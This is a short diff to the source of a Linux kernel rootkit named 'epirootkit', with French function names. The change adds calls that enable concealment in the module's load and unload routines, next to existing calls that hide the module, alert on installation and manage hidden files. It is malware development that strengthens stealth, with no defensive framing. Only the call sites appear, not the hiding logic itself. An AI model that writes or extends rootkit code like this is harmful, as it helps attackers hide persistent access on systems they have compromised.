@@ -215,6 +215,7 @@ static int __init epirootkit_init(void)
     }
     
     cacher_module();
+    activer_dissimulation();
     envoyer_alerte_installation();
     pr_info("epirootkit: Module initialise avec succes\n");
     
@@ -229,7 +230,8 @@ static void __exit epirootkit_exit(void)
     
     if (sockfd)
         sock_release(sockfd);
-    
+
+    activer_dissimulation();
     liberer_fichiers_caches();
     
     pr_info("epirootkit: Module supprime\n");
